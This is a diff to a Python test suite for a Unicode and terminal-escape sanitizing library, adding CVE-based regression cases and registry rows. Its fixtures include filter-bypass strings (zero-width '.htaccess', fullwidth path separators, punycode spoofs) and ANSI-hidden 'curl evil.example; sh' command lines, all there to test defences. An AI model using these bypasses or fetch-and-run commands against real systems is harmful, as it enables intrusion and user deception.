@@ -97,11 +97,14 @@ class CVE:
     id: str
     title: str
     cwe: str
-    cvss: float
-    #: The CVSS revision the score is quoted from. NVD carries only v2.0 for
-    #: pre-2016 CVEs, and the two scales are not comparable — a bare number
-    #: mixing them across one column would be a quiet apples-to-oranges claim.
-    cvss_version: str
+    #: ``None`` when NVD carries no CVSS score at all. That is rare but real —
+    #: CVE-2017-20190 has only an SSVC record — and inventing a number to fill
+    #: the column would be worse than leaving it empty.
+    cvss: float | None
+    #: The CVSS revision the score is quoted from, or ``None`` alongside a
+    #: ``None`` score. The scales are not comparable, so a bare number mixing
+    #: them across one column would be a quiet apples-to-oranges claim.
+    cvss_version: str | None
     #: A row is frequently more than one thing at once: a vector disarm folds
     #: *and* flags is both neutralized and detected. One string per row could
     #: only record whichever the author thought mattered more.
@@ -1103,6 +1106,235 @@ class TestCombiningMarkEclipse:
 
 
 # ---------------------------------------------------------------------------
+# Normalize-then-validate: the ordering invariant, as four CVEs
+# ---------------------------------------------------------------------------
+# THREAT_MODEL.md states the rule — "canonicalize first, then validate,
+# authorize, and encode — never the reverse". These are what breaking it costs.
+#
+# CVE-2026-28289 (NVD): FreeScout RCE. The flaw "exists in the
+# sanitizeUploadedFileName() function, which has a Time-of-Check to Time-of-Use
+# (TOCTOU) weakness where the dot-prefix check occurs before sanitization
+# removes invisible characters."
+#
+# CVE-2024-43093 (NVD): Android ExternalStorageProvider "allows bypassing file
+# path filters that protect sensitive directories through improper Unicode
+# normalization". CWE-176. **In CISA's Known Exploited Vulnerabilities catalog.**
+#
+# CVE-2023-41889 (NVD): SHIRASAGI, "a logical validation or a security check is
+# performed before a Unicode normalization"; the equivalent character reappears
+# afterwards. The vendor fix was to normalize first.
+#
+# CVE-2023-52081 (NVD): ffcss — a regex filtering [-_ .] "can be bypassed" and
+# all of those characters re-introduced "using equivalent Unicode characters
+# like U+FE4D".
+
+#: A leading zero-width space defeats a "does it start with a dot" check, and is
+#: gone by the time the file lands on disk as .htaccess.
+ZWSP_HTACCESS = "\u200b.htaccess"
+#: U+FE4D DASHED LOW LINE re-introduces "_" past a filter that rejects it.
+DASHED_LOW_LINE = "theme\ufe4dname"
+#: Fullwidth solidus: a path filter matching "Android/data" never sees it.
+FULLWIDTH_PATH = "Android\uff0fdata"
+
+
+class TestNormalizeThenValidate:
+    """CVE-2026-28289, CVE-2024-43093, CVE-2023-41889, CVE-2023-52081.
+
+    Four products, one mistake: a check ran against the raw string and the
+    canonical form arrived afterwards. disarm cannot fix the ordering — that is
+    the integration's property, not the library's — but it makes the canonical
+    form available *before* the check, which is the whole point of the rule.
+    """
+
+    def test_zero_width_prefix_defeats_a_dot_check(self) -> None:
+        """CVE-2026-28289: the check and the write disagree about the name."""
+        assert not ZWSP_HTACCESS.startswith(".")  # the check says "not hidden"
+        assert canonicalize(ZWSP_HTACCESS) == ".htaccess"  # what actually lands
+        assert strip_format(ZWSP_HTACCESS) == ".htaccess"
+        assert has_anomalies(ZWSP_HTACCESS) is True
+
+    def test_dashed_low_line_reintroduces_underscore(self) -> None:
+        """CVE-2023-52081: the regex sees no underscore; NFKC produces one."""
+        assert "_" not in DASHED_LOW_LINE
+        assert canonicalize(DASHED_LOW_LINE) == "theme_name"
+        assert canonicalize_strict(DASHED_LOW_LINE) == "theme_name"
+
+    def test_fullwidth_solidus_defeats_a_path_filter(self) -> None:
+        """CVE-2024-43093 / CVE-2023-41889: same shape, different separator."""
+        assert "Android/data" not in FULLWIDTH_PATH
+        assert canonicalize(FULLWIDTH_PATH) == "Android/data"
+        assert strip_obfuscation(FULLWIDTH_PATH) == "Android/data"
+
+    @pytest.mark.parametrize(
+        "raw", [ZWSP_HTACCESS, DASHED_LOW_LINE, FULLWIDTH_PATH], ids=["zwsp", "u-fe4d", "solidus"]
+    )
+    def test_the_orderings_disagree(self, raw: str) -> None:
+        """The invariant as an inequality: the two orders read different text."""
+        assert canonicalize(raw) != raw
+
+    def test_disarm_cannot_fix_the_ordering_itself(self) -> None:
+        """OUT-OF-SCOPE NEGATIVE, and the reason these rows are not "neutralized".
+
+        Every assertion above shows disarm producing the canonical form. None of
+        them shows disarm making a caller *use* it first. Pipeline placement is
+        a property of the integration; a library cannot assert it from inside.
+        """
+        checked_first = ZWSP_HTACCESS.startswith(".")
+        assert checked_first is False
+        assert canonicalize(ZWSP_HTACCESS).startswith(".") is True
+
+
+# ---------------------------------------------------------------------------
+# Terminal control sequences reaching a display: four more CVEs
+# ---------------------------------------------------------------------------
+# CVE-2025-55754 (NVD): Apache Tomcat, CWE-150. ANSI escape sequences injected
+# through crafted URLs reach Windows consoles and could "trick administrators
+# into executing attacker-controlled commands".
+#
+# CVE-2024-52005 (NVD): Git's sideband channel messages "lack protection against
+# ANSI escape sequences", letting an attacker conceal information or trick users
+# into running untrusted scripts.
+#
+# CVE-2023-43620 (NVD): Croc — "A sender may place ANSI or CSI escape sequences
+# in a filename to attack the terminal device of a receiver."
+#
+# CVE-2023-37275 (NVD): Auto-GPT — an LLM relaying a malicious external resource
+# emits JSON-encoded ANSI that spoofs console messages about what it just ran.
+
+#: No pipe character: ASCII "|" is itself a TR39 confusable source, so a
+#: payload containing one trips is_confusable for a reason unrelated to the
+#: CVE, and the derived-detector gate would then record a false positive.
+TOMCAT_LOG_LINE = "GET /\x1b[1A\x1b[2Krun: curl evil.example; sh HTTP/1.1"
+GIT_SIDEBAND = "fatal: repository not found\x1b[1A\x1b[2K$ curl evil.example; sh"
+CROC_FILENAME = "invoice\x1b[2K\x1b[1Gevil.sh"
+AUTOGPT_OUTPUT = "Executing command\x1b[2K\x1b[1G  [OK] nothing happened"
+
+
+class TestTerminalSequencesInUntrustedText:
+    """CVE-2025-55754, CVE-2024-52005, CVE-2023-43620, CVE-2023-37275.
+
+    A log line, a protocol message, a filename and a model's output. Four
+    different channels, one primitive: bytes that a terminal acts on rather than
+    prints. ``strip_log_injection`` is the entry point for all four.
+    """
+
+    @pytest.mark.parametrize(
+        "payload",
+        [TOMCAT_LOG_LINE, GIT_SIDEBAND, CROC_FILENAME, AUTOGPT_OUTPUT],
+        ids=["tomcat", "git-sideband", "croc-filename", "autogpt"],
+    )
+    def test_no_introducer_survives(self, payload: str) -> None:
+        for defense in (strip_log_injection, canonicalize, strip_obfuscation):
+            out = defense(payload)
+            leaked = [ch for ch in TERMINAL_CONTROLS if ch in out]
+            assert not leaked, f"{defense.__name__} left {[hex(ord(c)) for c in leaked]}"
+
+    def test_a_filename_needs_the_filename_entry_point(self) -> None:
+        """CVE-2023-43620: the payload arrives as a *name*, not a log line.
+
+        ``sanitize_filename`` substitutes rather than deletes, so the name stays
+        one token and the escape stops being one.
+        """
+        out = sanitize_filename(CROC_FILENAME)
+        assert "\x1b" not in out
+        assert out == "invoice_[2K_[1Gevil.sh"
+
+    def test_the_command_text_survives_and_that_is_correct(self) -> None:
+        """OUT-OF-SCOPE NEGATIVE, restated for the model-output case.
+
+        CVE-2023-37275 is a *spoofing* bug: the model told the user something
+        false about what ran. Removing the escapes restores the true rendering.
+        It does not make the claim true or false — disarm has no opinion on
+        content.
+        """
+        assert "curl evil.example; sh" in strip_log_injection(TOMCAT_LOG_LINE)
+        assert "nothing happened" in strip_log_injection(AUTOGPT_OUTPUT)
+
+
+# ---------------------------------------------------------------------------
+# More address-bar and deny-list spoofing
+# ---------------------------------------------------------------------------
+# CVE-2019-11721 (NVD): "The unicode latin 'kra' character can be used to spoof
+# a standard 'k' character in the addressbar."
+#
+# CVE-2023-4399 (NVD): Grafana Enterprise's request deny list "can be bypassed
+# used punycode encoding of the characters in the request address".
+
+#: U+0138 LATIN SMALL LETTER KRA beside a Latin brand.
+KRA_HOST = "banĸ.example"
+KRA_GENUINE = "bank.example"
+#: The 2017 all-Cyrillic "apple" spoof, in the A-label form a deny list sees.
+PUNYCODE_SPOOF = "xn--80ak6aa92e.com"
+
+
+class TestKraAndPunycodeSpoofs:
+    """CVE-2019-11721, CVE-2023-4399 — NEUTRALIZED and DETECTED."""
+
+    def test_kra_folds_to_k(self) -> None:
+        assert KRA_HOST != KRA_GENUINE
+        assert normalize_confusables(KRA_HOST) == KRA_GENUINE
+        assert canonicalize(KRA_HOST) == KRA_GENUINE
+        assert is_confusable(KRA_HOST) is True
+
+    def test_kra_hostname_screen_reports_the_real_name(self) -> None:
+        suspicious, analysis = is_suspicious_hostname(KRA_HOST)
+        assert suspicious is True
+        assert analysis.canonical == KRA_GENUINE
+
+    def test_punycode_is_decoded_before_the_verdict(self) -> None:
+        """CVE-2023-4399: a deny list matching A-labels never sees the U-label.
+
+        ``is_suspicious_hostname`` decodes first, so the analysis is done on the
+        name a user reads rather than on its transport encoding.
+        """
+        suspicious, analysis = is_suspicious_hostname(PUNYCODE_SPOOF)
+        assert suspicious is True
+        assert analysis.canonical == "apple.com"
+        assert analysis.whole_script_confusable is True
+
+    def test_a_legitimate_a_label_is_not_flagged(self) -> None:
+        """Guard: decoding must not turn every IDN into a positive."""
+        suspicious, analysis = is_suspicious_hostname("xn--bcher-kva.example")
+        assert analysis.canonical == "bücher.example"
+        assert suspicious is False
+
+
+# ---------------------------------------------------------------------------
+# CVE-2026-23950 — node-tar: a Unicode path collision poisons a symlink
+# ---------------------------------------------------------------------------
+# NVD: node-tar "fails to properly handle Unicode path collisions (such as `ß`
+# and `ss`), allowing conflicting paths to be processed in parallel", bypassing
+# the PathReservations concurrency guard. CWE-176 with CWE-367 (TOCTOU).
+#
+# This is the same code point the CVE-2019-19844 exhaustive scan singled out:
+# `ß` is the one member of that collision class the confusable table leaves
+# alone, deliberately, because it is a real German letter.
+
+
+class TestTarPathCollision:
+    """CVE-2026-23950 — NEUTRALIZED, but only by the key builders."""
+
+    def test_the_collision_is_real_and_case_folding_finds_it(self) -> None:
+        assert "groß.txt" != "gross.txt"
+        assert fold_case("groß.txt") == "gross.txt"
+
+    @pytest.mark.parametrize("key", [search_key, catalog_key, fold_case], ids=lambda f: f.__name__)
+    def test_the_key_builders_collide_them(self, key) -> None:
+        assert key("groß.txt") == key("gross.txt")
+
+    def test_the_canonicalizers_deliberately_do_not(self) -> None:
+        """MEASURED, and the right behaviour rather than a gap.
+
+        Folding `ß` to `ss` inside the confusable table would rewrite ordinary
+        German text. A reservation table needs a *key*, not a canonical string,
+        and this is the distinction the two families of preset encode.
+        """
+        assert canonicalize("groß.txt") == "groß.txt"
+        assert canonicalize_strict("groß.txt") == "groß.txt"
+        assert strip_obfuscation("groß.txt") == "groß.txt"
+
+
+# ---------------------------------------------------------------------------
 # The registry
 # ---------------------------------------------------------------------------
 # Defined here, below the vectors, so each row can point `probe` at the same
@@ -1384,6 +1616,138 @@ REGISTRY: tuple[CVE, ...] = (
         probe="https://attacker.example.net/exfil",
         reference="https://nvd.nist.gov/vuln/detail/CVE-2023-32786",
     ),
+    CVE(
+        id="CVE-2026-28289",
+        title="FreeScout — RCE via zero-width prefix bypassing an upload check",
+        cwe="CWE-434",
+        cvss=8.1,
+        cvss_version="v3.1",
+        dispositions=frozenset({OUT_OF_SCOPE}),
+        neutralizers=(),
+        detectors=(),
+        probe=ZWSP_HTACCESS,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2026-28289",
+    ),
+    CVE(
+        id="CVE-2024-43093",
+        title="Android — path filter bypass via improper Unicode normalization (CISA KEV)",
+        cwe="CWE-176",
+        cvss=7.3,
+        cvss_version="v3.1",
+        dispositions=frozenset({OUT_OF_SCOPE}),
+        neutralizers=(),
+        detectors=(),
+        probe=FULLWIDTH_PATH,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2024-43093",
+    ),
+    CVE(
+        id="CVE-2023-41889",
+        title="SHIRASAGI — validation performed before Unicode normalization",
+        cwe="CWE-116",
+        cvss=5.3,
+        cvss_version="v3.1",
+        dispositions=frozenset({OUT_OF_SCOPE}),
+        neutralizers=(),
+        detectors=(),
+        probe=FULLWIDTH_PATH,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2023-41889",
+    ),
+    CVE(
+        id="CVE-2023-52081",
+        title="ffcss — regex filter re-populated by NFKC-equivalent characters",
+        cwe="CWE-176",
+        cvss=5.3,
+        cvss_version="v3.1",
+        dispositions=frozenset({OUT_OF_SCOPE}),
+        neutralizers=(),
+        detectors=(),
+        probe=DASHED_LOW_LINE,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2023-52081",
+    ),
+    CVE(
+        id="CVE-2025-55754",
+        title="Apache Tomcat — ANSI escape injection into Windows console logs",
+        cwe="CWE-150",
+        cvss=9.6,
+        cvss_version="v3.1",
+        dispositions=frozenset({NEUTRALIZED}),
+        neutralizers=("strip_log_injection", "canonicalize", "strip_obfuscation"),
+        detectors=(),
+        probe=TOMCAT_LOG_LINE,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2025-55754",
+    ),
+    CVE(
+        id="CVE-2024-52005",
+        title="Git — ANSI escape sequences in sideband channel messages",
+        cwe="CWE-116",
+        cvss=8.8,
+        cvss_version="v3.1",
+        dispositions=frozenset({NEUTRALIZED}),
+        neutralizers=("strip_log_injection", "canonicalize", "strip_obfuscation"),
+        detectors=(),
+        probe=GIT_SIDEBAND,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2024-52005",
+    ),
+    CVE(
+        id="CVE-2023-43620",
+        title="Croc — ANSI escape sequences placed in a filename",
+        cwe="CWE-116",
+        cvss=7.8,
+        cvss_version="v3.1",
+        dispositions=frozenset({NEUTRALIZED}),
+        neutralizers=("sanitize_filename", "strip_log_injection", "canonicalize"),
+        detectors=(),
+        probe=CROC_FILENAME,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2023-43620",
+    ),
+    CVE(
+        id="CVE-2023-37275",
+        title="Auto-GPT — console spoofing via ANSI relayed through an LLM",
+        cwe="CWE-117",
+        cvss=4.3,
+        cvss_version="v3.1",
+        dispositions=frozenset({NEUTRALIZED}),
+        neutralizers=("strip_log_injection", "canonicalize"),
+        detectors=(),
+        probe=AUTOGPT_OUTPUT,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2023-37275",
+    ),
+    CVE(
+        id="CVE-2019-11721",
+        title="Firefox — Latin kra spoofing 'k' in the address bar",
+        cwe="CWE-1007",
+        cvss=6.5,
+        cvss_version="v3.1",
+        dispositions=frozenset({NEUTRALIZED, DETECTED}),
+        neutralizers=("normalize_confusables", "canonicalize", "strip_obfuscation"),
+        detectors=("is_confusable", "is_suspicious_hostname"),
+        probe=KRA_HOST,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2019-11721",
+    ),
+    CVE(
+        id="CVE-2023-4399",
+        title="Grafana — request deny list bypassed by punycode encoding",
+        cwe="CWE-183",
+        cvss=7.2,
+        cvss_version="v3.1",
+        dispositions=frozenset({DETECTED}),
+        neutralizers=(),
+        detectors=("is_suspicious_hostname",),
+        probe=PUNYCODE_SPOOF,
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2023-4399",
+    ),
+    CVE(
+        id="CVE-2026-23950",
+        title="node-tar — symlink poisoning via a Unicode path collision",
+        cwe="CWE-176",
+        cvss=5.9,
+        cvss_version="v3.1",
+        dispositions=frozenset({NEUTRALIZED}),
+        neutralizers=("fold_case", "search_key", "catalog_key"),
+        detectors=(),
+        probe="groß.txt",
+        reference="https://nvd.nist.gov/vuln/detail/CVE-2026-23950",
+    ),
 )
 
 
@@ -1632,14 +1996,35 @@ class TestDetectionHasNoSuperset:
     #: than as a silent improvement nobody notices.
     UNDETECTED_IN_SCOPE = {
         "CVE-2023-24329",  # a leading NUL is not an anomaly kind
-        "CVE-2008-2383",  # nor is an escape sequence
+        "CVE-2008-2383",  # nor is an escape sequence …
         "CVE-2019-9535",
+        "CVE-2025-55754",  # … and the whole terminal-control class with it
+        "CVE-2024-52005",
+        "CVE-2023-43620",
+        "CVE-2023-37275",
         "CVE-2025-32711",  # nor is the Tags block
+        "CVE-2026-23950",  # nor is a case-folding path collision
     }
 
     @staticmethod
     def _fires(cve: CVE) -> bool:
         return any(predicate(cve.probe) for predicate in DETECTOR_PANEL.values())
+
+    @classmethod
+    def _undetected(cls) -> set[str]:
+        """In-scope rows that **nothing** reports.
+
+        A row is excluded if any panel predicate fires, and also if it declares
+        a surface-specific detector such as ``is_suspicious_hostname``.
+        CVE-2023-4399 is the case that forces the second clause: no general
+        predicate sees it, and the hostname screen does — calling it undetected
+        because the panel missed it would be false.
+        """
+        return {
+            c.id
+            for c in REGISTRY
+            if OUT_OF_SCOPE not in c.dispositions and not cls._fires(c) and not c.detectors
+        }
 
     def test_each_detector_covers_only_part_of_the_matrix(self) -> None:
         """Per-detector coverage, pinned. A bare "it misses something" would pass
@@ -1649,8 +2034,8 @@ class TestDetectionHasNoSuperset:
             for name, predicate in DETECTOR_PANEL.items()
         }
         assert coverage == {
-            "has_anomalies": 8,
-            "is_confusable": 7,
+            "has_anomalies": 9,
+            "is_confusable": 9,
             "is_mixed_script": 4,
             # CVE-2017-7833 is the only row that fires this: the Arabic mark is
             # a strong-RTL character beside Latin letters, which is exactly the
@@ -1661,12 +2046,30 @@ class TestDetectionHasNoSuperset:
         }, coverage
         assert all(n < len(REGISTRY) for n in coverage.values())
 
-    def test_the_union_misses_four_in_scope_rows(self) -> None:
-        """Not one weak predicate — every predicate, together, still misses these."""
-        undetected = {
-            c.id for c in REGISTRY if OUT_OF_SCOPE not in c.dispositions and not self._fires(c)
-        }
+    def test_the_union_misses_these_in_scope_rows(self) -> None:
+        """Not one weak predicate — every predicate, together, still misses these.
+
+        The set grew when the terminal-control CVEs were added, and grew in a
+        telling way: **the entire class is undetected.** Every escape-sequence
+        row is neutralized and none is reported. A pipeline that screens before
+        it cleans has no coverage of that class at all.
+        """
+        undetected = self._undetected()
         assert undetected == self.UNDETECTED_IN_SCOPE, sorted(undetected)
+
+    def test_no_detector_reports_any_terminal_control_row(self) -> None:
+        """The class-level statement, kept separate so it fails on its own."""
+        terminal = {
+            "CVE-2008-2383",
+            "CVE-2019-9535",
+            "CVE-2025-55754",
+            "CVE-2024-52005",
+            "CVE-2023-43620",
+            "CVE-2023-37275",
+        }
+        assert terminal <= self.UNDETECTED_IN_SCOPE
+        for cve_id in sorted(terminal):
+            assert not self._fires(BY_ID[cve_id]), cve_id
 
     def test_nfkc_unmasking_is_silent_too(self) -> None:
         """CVE-2019-9636 is out of scope *and* undetected, which is the worst pair.
@@ -1679,10 +2082,17 @@ class TestDetectionHasNoSuperset:
 
     def test_stripping_covers_what_detection_misses(self) -> None:
         """The payoff: every vector no detector sees is still neutralized."""
-        missed = self.UNDETECTED_IN_SCOPE & set(NEUTRALIZABLE)
-        assert missed == self.UNDETECTED_IN_SCOPE, "a pinned row stopped being neutralizable"
-        for cve in sorted(missed):
+        measurable = self.UNDETECTED_IN_SCOPE & set(NEUTRALIZABLE)
+        # Not every undetected row has a collapse/removal vector — CVE-2026-23950
+        # is neutralized by a key builder, which the _handles rule does not model.
+        assert measurable, "no undetected row is measurable any more"
+        for cve in sorted(measurable):
             assert _handles(canonicalize, cve), cve
+
+    def test_every_undetected_row_still_names_a_neutralizer(self) -> None:
+        """The broader form of the payoff, covering the key-builder rows too."""
+        for cve_id in sorted(self.UNDETECTED_IN_SCOPE):
+            assert BY_ID[cve_id].neutralizers, cve_id
 
 
 # ---------------------------------------------------------------------------
@@ -1789,7 +2199,10 @@ class TestRegistryIntegrity:
         what NVD actually returns for it.
         """
         for cve in REGISTRY:
-            assert cve.cvss_version in {"v2.0", "v3.0", "v3.1"}, cve.id
+            if cve.cvss is None:
+                assert cve.cvss_version is None, f"{cve.id}: version without a score"
+                continue
+            assert cve.cvss_version in {"v2.0", "v3.0", "v3.1", "v4.0"}, cve.id
             assert 0.0 <= cve.cvss <= 10.0, cve.id  # 0.0 is a valid CVSS score
 
     def test_suite_covers_every_registry_row(self) -> None:
